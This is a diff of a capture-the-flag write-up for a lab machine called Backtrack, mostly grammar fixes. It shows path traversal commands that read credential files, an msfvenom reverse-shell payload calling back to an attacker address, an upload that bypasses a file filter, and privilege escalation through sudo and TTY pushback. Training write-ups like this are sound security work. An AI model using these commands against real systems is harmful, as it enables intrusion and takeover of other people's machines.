@@ -4,7 +4,7 @@
 
 {{header("Enumeration", "enumeration")}}
 
-{{text("We begin with an <strong>Nmap</strong> scan and try to find open ports.")}}
+{{text("We begin with an <strong>Nmap</strong> scan to identify open ports.")}}
 
 {{console("nmap -T5 -p- 10.10.156.56", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-14 14:01 EST
 Warning: 10.10.156.56 giving up on port because retransmission cap hit (2).
@@ -17,11 +17,11 @@ PORT      STATE    SERVICE
 8080/tcp  open     http-proxy
 8888/tcp  open     sun-answerbook")}}
 
-{{text("We find 4 open ports: ")}}
+{{text("We find 4 open ports:")}}
 
 {{list(['22 (SSH)', '6800 (Unknown)', '8080 (HTTP)', '8888 (Sun-Answerbook)'])}}
 
-{{text("We should investigate those ports further.")}}
+{{text("We should investigate these ports further.")}}
 
 {{console('nmap -sC -sV -p 22,6800,8080,8888 10.10.156.56', "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-14 14:10 EST
 Nmap scan report for 10.10.156.56
@@ -43,21 +43,21 @@ PORT     STATE SERVICE         VERSION
 |     HTTP/1.1 200 OK
 ...")}}
 
-{{text("We can see the name <code class='bg-gray-300 rounded-md px-1'>aria2</code>. After a quick search we discover that it is a file downloading tool.")}}
+{{text("We notice the name <code class='bg-gray-300 rounded-md px-1'>aria2</code>. After a quick search, we discover that it is a file downloading tool.")}}
 
-{{text("Visting the page on port 8888, we find the <code class='bg-gray-300 rounded-md px-1'>aria2</code> web application.")}}
+{{text("Visiting the page on port 8888, we find the <code class='bg-gray-300 rounded-md px-1'>aria2</code> web application.")}}
 
 {{image("../../static/images/backtrack/000001.jpg")}}
 
-{{text("By checking the server info in the settings tab we discover the <code class='bg-gray-300 rounded-md px-1'>aria2</code> version is 1.35.0")}}
+{{text("By checking the server info in the settings tab, we discover that the <code class='bg-gray-300 rounded-md px-1'>aria2</code> version is 1.35.0.")}}
 
 {{header("Shell as tomcat", "shell-as-tomcat")}}
 
-{{text("While searching for a vulnerability in this version, we come across this.")}}
+{{text("While searching for a vulnerability in this version, we come across the following.")}}
 
 {{link("https://gist.github.com/JafarAkhondali/528fe6c548b78f454911fb866b23f66e", "https://github.com/favicon.ico", "webui-aria2 CVE-2023-39141")}}
 
-{{text("It is a path travelsal vulnerability that allows us to read files outside the serving path.")}}
+{{text("It is a path traversal vulnerability that allows us to read files outside the serving path.")}}
 
 {{text("Let's try the payload provided.")}}
 
@@ -73,9 +73,9 @@ orville:x:1003:1003::/home/orville:/bin/bash
 wilbur:x:1004:1004::/home/wilbur:/bin/bash
 ...")}}
 
-{{text("The payload works and we are able to view the users that exist on the server. We notice the <code class='bg-gray-300 rounded-md px-1'>tomcat</code> user with home directory at <code class='bg-gray-300 rounded-md px-1'>/opt/tomcat</code>. Tomcat users are stored in a XML file, so if we can find it we should get our first set of credentials.")}}
+{{text("The payload works, and we are able to view the users on the server. We notice the <code class='bg-gray-300 rounded-md px-1'>tomcat</code> user with a home directory at <code class='bg-gray-300 rounded-md px-1'>/opt/tomcat</code>. Tomcat users are typically stored in an XML file, so if we can find it, we should obtain our first set of credentials.")}}
 
-{{text("Searching for tomcat users xml file location we learn that it should be at <code class='bg-gray-300 rounded-md px-1'>/conf/tomcat-users.xml</code>. Let's try to read this file.")}}
+{{text("Searching for the location of the Tomcat users' XML file, we learn that it should be located at <code class='bg-gray-300 rounded-md px-1'>/conf/tomcat-users.xml</code>. Let's try to read this file.")}}
 
 {{console("curl --path-as-is http://10.10.156.56:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml", "<?xml version='1.0' encoding='UTF-8'?>
 <tomcat-users xmlns='http://tomcat.apache.org/xml'
@@ -84,27 +84,27 @@ wilbur:x:1004:1004::/home/wilbur:/bin/bash
               version='1.0'>
 
   <role rolename='manager-script'/>
-  <user username='tomcat' password='[REDACTED]' roles='manager-script'/>
+  <user username='tomcat' password='[REDACTED]' roles='manager-script'/> 
 
 </tomcat-users>")}}
 
-{{text("Let's now switch to the <code class='bg-gray-300 rounded-md px-1'>tomcat</code> server at port 8080 and log in with our credentials by going to the <code class='bg-gray-300 rounded-md px-1'>Manager App</code>.")}}
+{{text("Now, let's switch to the <code class='bg-gray-300 rounded-md px-1'>tomcat</code> server at port 8080 and log in with our credentials by accessing the <code class='bg-gray-300 rounded-md px-1'>Manager App</code>.")}}
 
 {{image("../../static/images/backtrack/000002.jpg")}}
 
-{{text("Sadly, we don't have neccessary permissions to access the GUI because of our <code class='bg-gray-300 rounded-md px-1'>manager-script</code> role.")}}
+{{text("Unfortunately, we lack the necessary permissions to access the GUI due to our <code class='bg-gray-300 rounded-md px-1'>manager-script</code> role.")}}
 
-{{text("But we do have some permissions, so I searched for ways to exploit our role and found this article.")}}
+{{text("However, we do have some permissions, so I searched for ways to exploit this role and found the following article.")}}
 
 {{link("https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00", "https://miro.medium.com/v2/5d8de952517e8160e40ef9841c781cdc14a5db313057fa3c3de41c6f5b494b19", "Exploiting Apache Tomcat manager-script role")}}
 
-{{text("Let's use <strong>msfvenom</strong> to generate a payload with reverse shell.")}}
+{{text("Let's use <strong>msfvenom</strong> to generate a payload with a reverse shell.")}}
 
 {{console("msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.9.4.147 LPORT=4445 -f war -o shell.war", "Payload size: 1101 bytes
 Final size of war file: 1101 bytes
 Saved as: shell.war")}}
 
-{{text("Now we should be able to upload it to the web server.")}}
+{{text("Now, we should be able to upload it to the web server.")}}
 
 {{console("curl -v -u tomcat:[REDACTED] --upload-file pwn.war 'http://10.10.156.56:8080/manager/text/deploy?path=/foo&update=true'", "Trying 10.10.156.56:8080...
 * Connected to 10.10.156.56 (10.10.156.56) port 8080
@@ -120,6 +120,8 @@ Saved as: shell.war")}}
 * upload completely sent off: 1101 bytes
 ...")}}
 
+{{text("After setting up a listener and navigating to <code class='bg-gray-300 rounded-md px-1'>http://10.10.156.56:8080/foo</code>, we should receive a reverse shell.")}}
+
 {{text("After setting up a listener, and going to <code class='bg-gray-300 rounded-md px-1'>http://10.10.156.56:8080/foo</code>, we should get back a reverse shell.")}}
 
 {{text("Going to <code class='bg-gray-300 rounded-md px-1'>/opt/tomcat</code> allows us to view our first flag.")}}
@@ -128,7 +130,7 @@ Saved as: shell.war")}}
 
 {{header("Shell as wilbur", "shell-as-wilbur")}}
 
-{{text("While looking for privilage escalation vectors we discover this.")}}
+{{text("While looking for privilege escalation vectors, we discover this.")}}
 
 {{console("sudo -l", "Matching Defaults entries for tomcat on Backtrack:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -138,7 +140,7 @@ User tomcat may run the following commands on Backtrack:
 
 {{text("We are able to run <code class='bg-gray-300 rounded-md px-1'>ansible-playbook</code> on all <code class='bg-gray-300 rounded-md px-1'>yml</code> files inside <code class='bg-gray-300 rounded-md px-1'>/opt/test_playbooks</code> as user <code class='bg-gray-300 rounded-md px-1'>wilbur</code>.")}}
 
-{{text("We find how to exploit <code class='bg-gray-300 rounded-md px-1'>ansible-playbook</code> sudo privilages.")}}
+{{text("We find how to exploit <code class='bg-gray-300 rounded-md px-1'>ansible-playbook</code> sudo privileges.")}}
 
 {{link("https://gtfobins.github.io/gtfobins/ansible-playbook/", "https://gtfobins.github.io/assets/logo.png", "ansible-playbook")}}
 
@@ -152,7 +154,7 @@ User tomcat may run the following commands on Backtrack:
 
 {{image("../../static/images/backtrack/000005.jpg")}}
 
-{{text("We should try to look for the app mentioned in the note")}}
+{{text("We should try to look for the app mentioned in the note.")}}
 
 {{console("netstat -tulnp", "Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
 tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
@@ -171,15 +173,15 @@ tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      
 
 {{image("../../static/images/backtrack/000006.jpg")}}
 
-{{text("We discover a image gallery app, we can use the credentials we found in the note to log in.")}}
+{{text("We discover an image gallery app, and we can use the credentials we found in the note to log in.")}}
 
-{{text("We are able to upload images, but not <code class='bg-gray-300 rounded-md px-1'>php</code> files. After testing I discovered that <code class='bg-gray-300 rounded-md px-1'>shell.png.php</code> goes through, but the <code class='bg-gray-300 rounded-md px-1'>php</code> still doesn't get executed.")}}
+{{text("We are able to upload images, but not <code class='bg-gray-300 rounded-md px-1'>php</code> files. After testing, I discovered that <code class='bg-gray-300 rounded-md px-1'>shell.png.php</code> goes through, but the <code class='bg-gray-300 rounded-md px-1'>php</code> file still doesn't get executed.")}}
 
 {{text("This was definitely the most confusing part of the room. What we had to do is <code class='bg-gray-300 rounded-md px-1'>double URL encode '../'</code> and our reverse shell should work.")}}
 
-{{text("I used a <code class='bg-gray-300 rounded-md px-1'>PHP PentestMonkey</code> reverse shell from <code class='bg-gray-300 rounded-md px-1'>revshells.com</code>, named my file <code class='bg-gray-300 rounded-md px-1'>%252e%252e%252fshell.png.php</code>, set up a listener and uploaded the file.")}}
+{{text("I used a <code class='bg-gray-300 rounded-md px-1'>PHP PentestMonkey</code> reverse shell from <code class='bg-gray-300 rounded-md px-1'>revshells.com</code>, named my file <code class='bg-gray-300 rounded-md px-1'>%252e%252e%252fshell.png.php</code>, set up a listener, and uploaded the file.")}}
 
-{{text("The reverse shell runs successfully and we get access to user <code class='bg-gray-300 rounded-md px-1'>orville</code>.")}}
+{{text("The reverse shell runs successfully, and we get access to user <code class='bg-gray-300 rounded-md px-1'>orville</code>.")}}
 
 {{text("We are able to find the second flag in our user home directory.")}}
 
@@ -187,7 +189,7 @@ tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      
 
 {{header("Shell as root", "shell-as-root")}}
 
-{{text("While looking for ways to exploit the machine, I downloaded <code class='bg-gray-300 rounded-md px-1'>pspy64</code> using a python server and wget to see if any commands get run in the background.")}}
+{{text("While looking for ways to exploit the machine, I downloaded <code class='bg-gray-300 rounded-md px-1'>pspy64</code> using a Python server and wget to see if any commands get run in the background.")}}
 
 {{image("../../static/images/backtrack/000009.jpg")}}
 
@@ -197,7 +199,7 @@ tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      
 
 {{link("https://www.errno.fr/TTYPushback.html", "null", "The oldest privesc: injecting careless administrators' terminals using TTY pushback")}}
 
-{{text("We modify the python code to add a <code class='bg-gray-300 rounded-md px-1'>s bit</code> to <code class='bg-gray-300 rounded-md px-1'>/bin/bash</code> in order to get root privilages.")}}
+{{text("We modify the Python code to add a <code class='bg-gray-300 rounded-md px-1'>s bit</code> to <code class='bg-gray-300 rounded-md px-1'>/bin/bash</code> in order to get root privileges.")}}
 
 {{text("We create a <code class='bg-gray-300 rounded-md px-1'>.py</code> file with the following code.")}}
 
@@ -206,19 +208,3 @@ tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      
 {{text("Now when we run <code class='bg-gray-300 rounded-md px-1'>echo root.py >> .bashrc</code> and wait a while, we should be able to run bash as root and get our final flag.")}}
 
 {{script()}}
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
